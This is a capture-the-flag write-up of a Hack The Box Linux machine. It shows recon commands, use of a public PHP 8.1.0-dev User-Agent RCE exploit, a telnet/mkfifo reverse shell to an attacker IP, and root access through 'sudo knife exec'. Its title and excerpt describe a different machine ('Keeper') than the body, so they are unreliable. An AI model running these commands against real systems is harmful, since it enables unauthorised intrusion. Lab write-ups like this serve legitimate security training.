---
layout: single
title: Keeper - Hack The Box
excerpt: "Keeper is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Enumerating the service, we are able to see clear text credentials that lead to SSH access. With 'SSH' access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the 'Keepass' database, we can access the root 'SSH' keys, which are used to gain a privileged shell on the host."
date: 2025-05-26
classes: wide
header:
  teaser: /img2/keeper.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - PHP 8.1.0-dev - 'User-Agent' Remote Code Execution [RCE]
  - Abusing Sudoers Privilege (Knife Binary) [Privilege Escalation]
---


## Reconnaissance

- Nmap 

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.242
```

![](/img2/Pasted%20image%2020250526145240.png)

- Whatweb 

```bash
whatweb http://10.10.10.242/
```

![](/img2/Pasted%20image%2020250526145404.png)

## Exploitation

- PHP 8.1.0-dev User Agent RCE

```bash
searchsploit php 8.1.0-dev
```

![](/img2/Pasted%20image%2020250526145645.png)

```bash
searchsploit -m php/webapps/49933.py
```

```bash
python3 49933.py
```

![](/img2/Pasted%20image%2020250526145735.png)

- Send reverse shell

```bash
TF=$(mktemp -u);mkfifo $TF && telnet 10.10.16.7 9000 0<$TF | /bin/bash 1>$TF
```

```bash
nc -nlvp 9000
```

## Post-exploitation

- Check sudoers

```bash
sudo -l
```

![](/img2/Pasted%20image%2020250526152256.png)

- Knife Sudoers

```bash
sudo knife exec -E 'exec "/bin/sh"'
```

![](/img2/Pasted%20image%2020250526152128.png)